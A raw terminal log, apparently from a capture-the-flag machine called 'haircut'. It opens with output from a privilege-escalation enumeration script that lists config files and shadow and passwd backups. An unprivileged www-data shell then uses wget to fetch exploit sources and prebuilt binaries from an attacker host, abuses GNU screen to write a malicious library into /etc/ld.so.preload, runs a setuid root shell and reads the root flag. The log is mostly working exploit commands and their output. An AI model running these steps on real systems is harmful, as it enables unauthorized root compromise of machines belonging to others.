--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control                                    
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/alsa-utils.service/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control                                     
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control                                           
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control                                 
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control                                     
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/php7.0-fpm.service/cgroup.event_control                                        
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control                                          
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control                              
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control                                     
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control                                           
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control                                
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control                                    
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control                                       
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control                               
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control                                             
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control                                          
--w--w--w- 1 root root 0 Jan  9 17:38 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control                                                             


[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems                                                                        
# /etc/fstab: static file system information.                                  
#                                      
# Use 'blkid' to print the universally unique identifier for a                 
# device; this may be used with UUID= as a more robust way to name devices     
# that works even if disks are added and removed. See fstab(5).                
#                                      
# <file system> <mount point>   <type>  <options>       <dump>  <pass>         
# / was on /dev/sda1 during installation                                       
UUID=67aff9e7-3a93-41a2-bcb4-03242c95bd0c /               ext4    errors=remount-ro 0       1                                                                  
# swap was on /dev/sda5 during installation                                    
UUID=21936632-4433-4221-ba64-7a75ed493f1a none            swap    sw              0       0                                                                    
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0     


[-] Can't search *.conf files as no keyword was entered                        

[-] Can't search *.php files as no keyword was entered                         

[-] Can't search *.log files as no keyword was entered                         

[-] Can't search *.ini files as no keyword was entered                         

[-] All *.conf files in /etc (recursive 1 level):                              
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf                          
-rw-r--r-- 1 root root 7649 May 16  2017 /etc/pnm2ppa.conf                     
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf                         
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf                       
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf                      
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf                     
-rw-r--r-- 1 root root 112 Jan 10  2014 /etc/apg.conf                          
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf                     
-rw-r--r-- 1 root root 350 May 15  2017 /etc/popularity-contest.conf           
-rw-r--r-- 1 root root 144 May 15  2017 /etc/kernel-img.conf                   
-rw-r--r-- 1 root root 7788 May 15  2017 /etc/ca-certificates.conf             
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf                     
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf                     
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf                      
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf                         
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf                      
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf                     
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf                    
-rw-r--r-- 1 root root 3028 Feb 15  2017 /etc/adduser.conf                     
-rw-r--r-- 1 root root 191 Jan 19  2016 /etc/libaudit.conf                     
-rw-r--r-- 1 root root 6816 Nov 30  2016 /etc/overlayroot.conf                 
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf                         
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf                      
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf                         
-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf                          
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf                          


[-] Location and contents (if accessible) of .bash_history file(s):            
/home/maria/.bash_history              


[-] Location and Permissions (if accessible) of .bak file(s):                  
-rw------- 1 root root 1751 May 22  2017 /var/backups/passwd.bak               
-rw------- 1 root shadow 744 May 16  2017 /var/backups/gshadow.bak             
-rw------- 1 root root 886 May 16  2017 /var/backups/group.bak                 
-rw------- 1 root shadow 1123 May 22  2017 /var/backups/shadow.bak             


[-] Any interesting mail in /var/mail: 
total 8                                
drwxrwsr-x  2 root mail 4096 Feb 15  2017 .                                    
drwxr-xr-x 14 root root 4096 May 16  2017 ..                                   


### SCAN COMPLETE ####################################                         
www-data@haircut:/dev/shm$ cd /tmp/    
www-data@haircut:/tmp$ echo "~ gnu/screenroot ~"                               
~ gnu/screenroot ~                     
www-data@haircut:/tmp$ echo "[+] First, we create our shell and library..."    
[+] First, we create our shell and library...                                  
www-data@haircut:/tmp$ wget http://10.10.14.14:8000/rootshell.c                
--2020-01-09 19:03:01--  http://10.10.14.14:8000/rootshell.c                   
Connecting to 10.10.14.14:8000... connected.                                   
HTTP request sent, awaiting response... 200 OK                                 
Length: 91 [text/plain]                
Saving to: 'rootshell.c'               

rootshell.c         100%[===================>]      91  --.-KB/s    in 0s                                                                                      

2020-01-09 19:03:01 (9.48 MB/s) - 'rootshell.c' saved [91/91]                  

www-data@haircut:/tmp$ wget http://10.10.14.14:8000/libhax.c                   
--2020-01-09 19:03:25--  http://10.10.14.14:8000/libhax.c                      
Connecting to 10.10.14.14:8000... connected.                                   
HTTP request sent, awaiting response... 200 OK                                 
Length: 252 [text/plain]               
Saving to: 'libhax.c'                  

libhax.c            100%[===================>]     252  --.-KB/s    in 0s                                                                                      

2020-01-09 19:03:25 (51.6 MB/s) - 'libhax.c' saved [252/252]                   

www-data@haircut:/tmp$ ls              
libhax.c                               
rootshell.c                            
systemd-private-6db88734b32f4c9fbb24112c5eabe93d-systemd-timesyncd.service-P948ZG                                                                              
vmware-root                            
www-data@haircut:/tmp$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c  
gcc: error trying to exec 'cc1': execvp: No such file or directory             
www-data@haircut:/tmp$ clear           
TERM environment variable not set.     
www-data@haircut:/tmp$ export TERM=screen-256color                             
www-data@haircut:/tmp$ clear           
www-data@haircut:/tmp$ ls              
libhax.c                               
rootshell.c                            
systemd-private-6db88734b32f4c9fbb24112c5eabe93d-systemd-timesyncd.service-P948ZG                                                                              
vmware-root                            
www-data@haircut:/tmp$ vi libhax.c     
www-data@haircut:/tmp$ gcc -o /tmp/rootshell /tmp/rootshell.c                  
gcc: error trying to exec 'cc1': execvp: No such file or directory             
www-data@haircut:/tmp$ wget 10.10.14.14:8000/rootshell                         
--2020-01-09 19:13:48--  http://10.10.14.14:8000/rootshell                     
Connecting to 10.10.14.14:8000... connected.                                   
HTTP request sent, awaiting response... 200 OK                                 
Length: 16720 (16K) [application/octet-stream]                                 
Saving to: 'rootshell'                 

rootshell           100%[===================>]  16.33K  4.66KB/s    in 3.5s                                                                                    

2020-01-09 19:13:55 (4.66 KB/s) - 'rootshell' saved [16720/16720]              

www-data@haircut:/tmp$ wget 10.10.14.14:8000/libhax.so                         
--2020-01-09 19:14:33--  http://10.10.14.14:8000/libhax.so                     
Connecting to 10.10.14.14:8000... connected.                                   
HTTP request sent, awaiting response... 200 OK                                 
Length: 16144 (16K) [application/octet-stream]                                 
Saving to: 'libhax.so'                 

libhax.so           100%[===================>]  15.77K  20.2KB/s    in 0.8s                                                                                    

2020-01-09 19:14:36 (20.2 KB/s) - 'libhax.so' saved [16144/16144]              

www-data@haircut:/tmp$ ls              
libhax.c                               
libhax.so                              
rootshell                              
rootshell.c                            
systemd-private-6db88734b32f4c9fbb24112c5eabe93d-systemd-timesyncd.service-P948ZG                                                                              
vmware-root                            
www-data@haircut:/tmp$ cd /etc/        
www-data@haircut:/etc$ umask 000       
www-data@haircut:/etc$ ls -la          
total 912                              
drwxr-xr-x 109 root root    4096 May 22  2017 .                                
drwxr-xr-x  23 root root    4096 May 16  2017 ..                               
-rw-------   1 root root       0 Feb 15  2017 .pwd.lock                        
drwxr-xr-x   4 root root    4096 May 16  2017 NetworkManager                   
drwxr-xr-x   2 root root    4096 May 16  2017 UPower                           
drwxr-xr-x  10 root root    4096 May 16  2017 X11                              
drwxr-xr-x   3 root root    4096 May 15  2017 acpi                             
-rw-r--r--   1 root root    3028 Feb 15  2017 adduser.conf                     
drwxr-xr-x   2 root root    4096 May 22  2017 alternatives                     
-rw-r--r--   1 root root     401 Dec 29  2014 anacrontab                       
drwxr-xr-x   3 root root    4096 May 16  2017 apache2                          
-rw-r--r--   1 root root     112 Jan 10  2014 apg.conf                         
drwxr-xr-x   6 root root    4096 May 16  2017 apm                              
drwxr-xr-x   3 root root    4096 May 16  2017 apparmor                         
drwxr-xr-x   9 root root    4096 May 16  2017 apparmor.d                       
drwxr-xr-x   4 root root    4096 May 16  2017 apport                           
drwxr-xr-x   6 root root    4096 May 16  2017 apt                              
drwxr-xr-x   2 root root    4096 May 16  2017 at-spi2                          
-rw-r-----   1 root daemon   144 Jan 14  2016 at.deny                          
-rw-r--r--   1 root root    2188 Sep  1  2015 bash.bashrc                      
-rw-r--r--   1 root root      45 Aug 12  2015 bash_completion                  
drwxr-xr-x   2 root root    4096 May 16  2017 bash_completion.d                
-rw-r--r--   1 root root     367 Jan 27  2016 bindresvport.blacklist           
drwxr-xr-x   2 root root    4096 Apr 12  2016 binfmt.d                         
drwxr-xr-x   2 root root    4096 May 16  2017 bluetooth                        
drwxr-xr-x   2 root root    4096 May 15  2017 byobu                            
drwxr-xr-x   3 root root    4096 May 15  2017 ca-certificates                  
-rw-r--r--   1 root root    7788 May 15  2017 ca-certificates.conf             
drwxr-xr-x   2 root root    4096 May 15  2017 calendar                         
drwxr-xr-x   2 root root    4096 May 16  2017 compizconfig                     
drwxr-xr-x   2 root root    4096 May 15  2017 console-setup                    
drwxr-xr-x   2 root root    4096 May 16  2017 cron.d                           
drwxr-xr-x   2 root root    4096 May 16  2017 cron.daily                       
drwxr-xr-x   2 root root    4096 May 15  2017 cron.hourly                      
drwxr-xr-x   2 root root    4096 May 16  2017 cron.monthly                     
drwxr-xr-x   2 root root    4096 May 16  2017 cron.weekly                      
-rw-r--r--   1 root root     722 Apr  5  2016 crontab                          
-rw-r--r--   1 root root      54 May 15  2017 crypttab                         
drwxr-xr-x   4 root root    4096 May 15  2017 dbus-1                           
drwxr-xr-x   4 root root    4096 May 16  2017 dconf                            
-rw-r--r--   1 root root    2969 Nov 10  2015 debconf.conf                     
-rw-r--r--   1 root root      12 Apr 30  2015 debian_version                   
drwxr-xr-x   3 root root    4096 May 22  2017 default                          
-rw-r--r--   1 root root     604 Jul  2  2015 deluser.conf                     
drwxr-xr-x   2 root root    4096 May 15  2017 depmod.d                         
drwxr-xr-x   4 root root    4096 May 15  2017 dhcp                             
drwxr-xr-x   2 root root    4096 May 16  2017 dnsmasq.d                        
drwxr-xr-x   3 root root    4096 May 16  2017 doc-base                         
drwxr-xr-x   4 root root    4096 May 16  2017 dpkg                             
-rw-r--r--   1 root root    4479 Jan 26  2017 drirc                            
drwxr-xr-x   3 root root    4096 May 16  2017 emacs                            
-rw-r--r--   1 root root      96 Feb 15  2017 environment                      
drwxr-xr-x   4 root root    4096 May 16  2017 fonts                            
-rw-r--r--   1 root root     669 May 15  2017 fstab                            
-rw-r--r--   1 root root     280 Jun 20  2014 fuse.conf                        
-rw-r--r--   1 root root    2584 Feb 18  2016 gai.conf                         
drwxr-xr-x   4 root root    4096 May 16  2017 ghostscript                      
drwxr-xr-x   2 root root    4096 May 16  2017 gnome                            
drwxr-xr-x   2 root root    4096 May 15  2017 groff                            
-rw-r--r--   1 root root     886 May 16  2017 group                            
-rw-------   1 root root     866 May 16  2017 group-                           
drwxr-xr-x   2 root root    4096 May 16  2017 grub.d                           
-rw-r-----   1 root shadow   744 May 16  2017 gshadow                          
-rw-------   1 root root     727 May 16  2017 gshadow-                         
drwxr-xr-x   3 root root    4096 May 15  2017 gss                              
drwxr-xr-x   2 root root    4096 May 16  2017 gtk-2.0                          
drwxr-xr-x   2 root root    4096 May 16  2017 gtk-3.0                          
-rw-r--r--   1 root root    4781 Mar 17  2016 hdparm.conf                      
-rw-r--r--   1 root root      92 Oct 22  2015 host.conf                        
-rw-r--r--   1 root root       8 May 15  2017 hostname                         
-rw-r--r--   1 root root     189 May 15  2017 hosts                            
-rw-r--r--   1 root root     411 May 16  2017 hosts.allow                      
-rw-r--r--   1 root root     711 May 16  2017 hosts.deny                       
drwxr-xr-x   2 root root    4096 May 22  2017 init                             
drwxr-xr-x   2 root root    4096 May 22  2017 init.d                           
drwxr-xr-x   5 root root    4096 May 15  2017 initramfs-tools                  
-rw-r--r--   1 root root    1748 Feb  4  2016 inputrc                          
drwxr-xr-x   3 root root    4096 May 15  2017 insserv                          
-rw-r--r--   1 root root     771 Mar  6  2015 insserv.conf                     
drwxr-xr-x   2 root root    4096 Mar  6  2015 insserv.conf.d                   
drwxr-xr-x   2 root root    4096 May 15  2017 iproute2                         
drwxr-xr-x   2 root root    4096 May 15  2017 iscsi                            
-rw-r--r--   1 root root      26 Feb  8  2017 issue                            
-rw-r--r--   1 root root      19 Feb  8  2017 issue.net                        
drwxr-xr-x   2 root root    4096 May 15  2017 kbd                              
drwxr-xr-x   5 root root    4096 May 15  2017 kernel                           
-rw-r--r--   1 root root     144 May 15  2017 kernel-img.conf                  
-rw-r--r--   1 root root   24939 May 19  2017 ld.so.cache                      
-rw-r--r--   1 root root      34 Jan 27  2016 ld.so.conf                       
drwxr-xr-x   2 root root    4096 May 16  2017 ld.so.conf.d                     
drwxr-xr-x   2 root root    4096 May 15  2017 ldap                             
-rw-r--r--   1 root root     267 Oct 22  2015 legal                            
-rw-r--r--   1 root root     191 Jan 19  2016 libaudit.conf                    
drwxr-xr-x   2 root root    4096 May 15  2017 libnl-3                          
drwxr-xr-x   2 root root    4096 May 16  2017 lightdm                          
-rw-r--r--   1 root root    2995 Apr 15  2016 locale.alias                     
-rw-r--r--   1 root root    9151 May 16  2017 locale.gen                       
-rw-r--r--   1 root root    2335 May 15  2017 localtime                        
drwxr-xr-x   6 root root    4096 May 16  2017 logcheck                         
-rw-r--r--   1 root root   10551 Mar 29  2016 login.defs                       
-rw-r--r--   1 root root     703 May  6  2015 logrotate.conf                   
drwxr-xr-x   2 root root    4096 May 16  2017 logrotate.d                      
-rw-r--r--   1 root root     105 Feb  8  2017 lsb-release                      
-rw-r--r--   1 root root   14867 Apr 12  2016 ltrace.conf                      
drwxr-xr-x   2 root root    4096 May 15  2017 lvm                              
-r--r--r--   1 root root      33 May 15  2017 machine-id                       
-rw-r--r--   1 root root     111 Nov 20  2015 magic                            
-rw-r--r--   1 root root     111 Nov 20  2015 magic.mime                       
-rw-r--r--   1 root root    3546 May 16  2017 mailcap                          
-rw-r--r--   1 root root     449 Oct 30  2015 mailcap.order                    
-rw-r--r--   1 root root    5170 Nov  7  2015 manpath.config                   
drwxr-xr-x   2 root root    4096 May 16  2017 mdadm                            
-rw-r--r--   1 root root   24241 Oct 30  2015 mime.types                       
-rw-r--r--   1 root root     967 Oct 30  2015 mke2fs.conf                      
drwxr-xr-x   2 root root    4096 May 16  2017 modprobe.d                       
-rw-r--r--   1 root root     195 Feb 15  2017 modules                          
drwxr-xr-x   2 root root    4096 May 16  2017 modules-load.d                   
lrwxrwxrwx   1 root root      19 May 15  2017 mtab -> ../proc/self/mounts      
drwxr-xr-x   4 root root    4096 May 16  2017 mysql                            
-rw-r--r--   1 root root    8338 Dec 16  2016 nanorc                           
drwxr-xr-x   7 root root    4096 May 26  2017 network                          
-rw-r--r--   1 root root      79 May 15  2017 networks                         
drwxr-xr-x   2 root root    4096 May 15  2017 newt                             
drwxr-xr-x   6 root root    4096 May 16  2017 nginx                            
-rw-r--r--   1 root root     497 May  4  2014 nsswitch.conf                    
drwxr-xr-x   2 root root    4096 Feb 15  2017 opt                              
lrwxrwxrwx   1 root root      21 May 15  2017 os-release -> ../usr/lib/os-release                                                                              
-rw-r--r--   1 root root    6816 Nov 30  2016 overlayroot.conf                 
-rw-r--r--   1 root root     552 Mar 16  2016 pam.conf                         
drwxr-xr-x   2 root root    4096 May 22  2017 pam.d                            
-rw-r--r--   1 root root       7 May 16  2017 papersize                        
-rw-r--r--   1 root root    1751 May 22  2017 passwd                           
-rw-------   1 root root    1751 May 22  2017 passwd-                          
drwxr-xr-x   4 root root    4096 May 15  2017 perl                             
drwxr-xr-x   3 root root    4096 May 16  2017 php                              
drwxr-xr-x   3 root root    4096 May 15  2017 pm                               
-rw-r--r--   1 root root    7649 May 16  2017 pnm2ppa.conf                     
drwxr-xr-x   5 root root    4096 May 15  2017 polkit-1                         
-rw-r--r--   1 root root     350 May 15  2017 popularity-contest.conf          
drwxr-xr-x   4 root root    4096 May 15  2017 ppp                              
-rw-r--r--   1 root root     575 Oct 22  2015 profile                          
drwxr-xr-x   2 root root    4096 May 16  2017 profile.d                        
-rw-r--r--   1 root root    2932 Oct 25  2014 protocols                        
drwxr-xr-x   2 root root    4096 May 16  2017 pulse                            
drwxr-xr-x   2 root root    4096 May 15  2017 python3                          
drwxr-xr-x   2 root root    4096 May 15  2017 python3.5                        
-rwxr-xr-x   1 root root     306 Feb 15  2017 rc.local                         
drwxr-xr-x   2 root root    4096 May 16  2017 rc0.d                            
drwxr-xr-x   2 root root    4096 May 16  2017 rc1.d                            
drwxr-xr-x   2 root root    4096 May 22  2017 rc2.d                            
drwxr-xr-x   2 root root    4096 May 22  2017 rc3.d                            
drwxr-xr-x   2 root root    4096 May 22  2017 rc4.d                            
drwxr-xr-x   2 root root    4096 May 22  2017 rc5.d                            
drwxr-xr-x   2 root root    4096 May 16  2017 rc6.d                            
drwxr-xr-x   2 root root    4096 May 16  2017 rcS.d                            
lrwxrwxrwx   1 root root      29 May 15  2017 resolv.conf -> ../run/resolvconf/resolv.conf                                                                     
drwxr-xr-x   4 root root    4096 May 16  2017 resolvconf                       
-rwxr-xr-x   1 root root     268 Nov 10  2015 rmt                              
-rw-r--r--   1 root root     887 Oct 25  2014 rpc                              
-rw-r--r--   1 root root    1371 Jan 27  2016 rsyslog.conf                     
drwxr-xr-x   2 root root    4096 May 15  2017 rsyslog.d                        
-rw-r--r--   1 root root    3663 Jun  9  2015 screenrc                         
-rw-r--r--   1 root root    4038 Mar 29  2016 securetty                        
drwxr-xr-x   4 root root    4096 May 16  2017 security                         
drwxr-xr-x   2 root root    4096 May 15  2017 selinux                          
-rw-r--r--   1 root root   19605 Oct 25  2014 services                         
drwxr-xr-x   2 root root    4096 May 16  2017 sgml                             
-rw-r-----   1 root shadow  1123 May 22  2017 shadow                           
-rw-------   1 root root    1123 May 22  2017 shadow-                          
-rw-r--r--   1 root root     103 May 15  2017 shells                           
drwxr-xr-x   2 root root    4096 May 15  2017 skel                             
-rw-r--r--   1 root root     100 Nov 25  2015 sos.conf                         
drwxr-xr-x   2 root root    4096 May 22  2017 ssh                              
drwxr-xr-x   4 root root    4096 May 15  2017 ssl                              
-rw-r--r--   1 root root      54 May 15  2017 subgid                           
-rw-------   1 root root      35 May 15  2017 subgid-                          
-rw-r--r--   1 root root      54 May 15  2017 subuid                           
-rw-------   1 root root      35 May 15  2017 subuid-                          
-r--r-----   1 root root     785 May 16  2017 sudoers                          
drwxr-xr-x   2 root root    4096 May 15  2017 sudoers.d                        
-rw-r--r--   1 root root    2084 Sep  6  2015 sysctl.conf                      
drwxr-xr-x   2 root root    4096 May 16  2017 sysctl.d                         
drwxr-xr-x   5 root root    4096 May 16  2017 systemd                          
drwxr-xr-x   2 root root    4096 May 15  2017 terminfo                         
-rw-r--r--   1 root root      14 May 15  2017 timezone                         
drwxr-xr-x   2 root root    4096 Apr 12  2016 tmpfiles.d                       
-rw-r--r--   1 root root    1260 Mar 16  2016 ucf.conf                         
drwxr-xr-x   4 root root    4096 May 16  2017 udev                             
drwxr-xr-x   3 root root    4096 May 15  2017 ufw                              
drwxr-xr-x   3 root root    4096 May 15  2017 update-manager                   
drwxr-xr-x   2 root root    4096 May 16  2017 update-motd.d                    
drwxr-xr-x   2 root root    4096 May 15  2017 update-notifier                  
-rw-r--r--   1 root root     338 Nov 18  2014 updatedb.conf                    
-rw-r--r--   1 root root     270 May 19  2016 upstart-xsessions                
drwxr-xr-x   2 root root    4096 May 15  2017 vim                              
drwxr-xr-x   3 root root    4096 May 15  2017 vmware-tools                     
lrwxrwxrwx   1 root root      23 May 15  2017 vtrgb -> /etc/alternatives/vtrgb 
-rw-r--r--   1 root root    4942 Jun 14  2016 wgetrc                           
drwxr-xr-x   2 root root    4096 May 16  2017 wpa_supplicant                   
drwxr-xr-x   5 root root    4096 May 16  2017 xdg                              
drwxr-xr-x   2 root root    4096 May 15  2017 xml                              
-rw-r--r--   1 root root     477 Jul 19  2015 zsh_command_not_found            
so"-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.                                                                               
www-data@haircut:/etc$ ls -la /tmp     
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                                                                       
[+] done!                              
total 84                               
drwxrwxrwt 10 root     root      4096 Jan  9 19:22 .                           
drwxr-xr-x 23 root     root      4096 May 16  2017 ..                          
drwxrwxrwt  2 root     root      4096 Jan  9 16:08 .ICE-unix                   
drwxrwxrwt  2 root     root      4096 Jan  9 16:08 .Test-unix                  
drwxrwxrwt  2 root     root      4096 Jan  9 16:08 .X11-unix                   
drwxrwxrwt  2 root     root      4096 Jan  9 16:08 .XIM-unix                   
drwxrwxrwt  2 root     root      4096 Jan  9 16:08 .font-unix                  
-rw-rw-rw-  1 www-data www-data   252 Jan  9 19:08 libhax.c                    
-rw-rw-rw-  1 www-data www-data 16144 Jan  9 19:10 libhax.so                   
-rwsr-xr-x  1 www-data www-data 16720 Jan  9 19:09 rootshell                   
-rw-rw-rw-  1 www-data www-data    91 Jan  9 18:58 rootshell.c                 
drwxr-xr-x  3 root     www-data  4096 Jan  9 19:22 screens                     
drwx------  3 root     root      4096 Jan  9 16:08 systemd-private-6db88734b32f4c9fbb24112c5eabe93d-systemd-timesyncd.service-P948ZG                           
drwx------  2 root     root      4096 Jan  9 16:08 vmware-root                 
www-data@haircut:/etc$ screen -ls      
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.                                                                       
[+] done!                              
No Sockets found in /tmp/screens/S-www-data.                                   

www-data@haircut:/etc$ /tmp/rootshell  
# id                                   
uid=0(root) gid=0(root) groups=0(root),33(www-data)                            
# cat root.txt                         
cat: root.txt: No such file or directory                                       
# cd ~                                 
# ls                                   
html                                   
# cat -                                
pwd                                    
pwd                                    
ls                                     
ls                                     
exit                                   
exit                                   
exit                                   
exit                                   
^Z[1] + Stopped                    cat -                                       
# ls                                   
html                                   
# ls -la                               
total 12                               
drwxr-xr-x  3 root root 4096 May 16  2017 .                                    
drwxr-xr-x 14 root root 4096 May 16  2017 ..                                   
drwxr-xr-x  3 root root 4096 May 19  2017 html                                 
# cd html                              
# ls                                   
bounce.jpg  exposed.php  index.html  test.html                                 
carrie.jpg  hair.html    sea.jpg     uploads                                   
# cd /root                             
# ls                                   
root.txt                               
# cat root.txt                         
4cfa26d84b2220826a07f0697dc72151       
# ^C                                   
# exit                                 
You have stopped jobs.                 
# exit                                 
www-data@haircut:/etc$ exit            
exit                                   
$                                      
